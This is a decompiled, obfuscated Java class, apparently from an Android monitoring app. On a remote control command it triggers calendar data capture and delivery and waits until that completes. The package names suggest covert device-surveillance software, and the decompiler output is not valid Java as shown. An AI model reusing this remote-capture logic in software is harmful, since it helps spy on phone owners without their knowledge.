package com.vvt.appengine.a;

import android.os.ConditionVariable;

import com.vvt.appengine.AppEngine1;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class x
{
  private static final boolean b = com.vvt.ak.a.a;
  com.vvt.datadeliverymanager.a.a a;
  private RmtCtrlOutputStatusMessage c;
  private ConditionVariable d;
  
  public x()
  {
    y localy = new com/vvt/appengine/a/y;
    localy.<init>(this);
    this.a = localy;
  }
  
  public RmtCtrlOutputStatusMessage a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    Object localObject = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject).<init>();
    this.c = ((RmtCtrlOutputStatusMessage)localObject);
    localObject = new android/os/ConditionVariable;
    com.vvt.datadeliverymanager.a.a locala = null;
    ((ConditionVariable)localObject).<init>(false);
    this.d = ((ConditionVariable)localObject);
    boolean bool = b;
    if (bool) {}
    localObject = paramh.N;
    locala = this.a;
    ((com.vvt.capture.calendar.a)localObject).a(locala);
    localObject = paramh.N;
    ((com.vvt.capture.calendar.a)localObject).c();
    bool = b;
    if (bool) {}
    localObject = this.d;
    ((ConditionVariable)localObject).block();
    bool = b;
    if (bool) {}
    paramh.i.a();
    return this.c;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/x.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */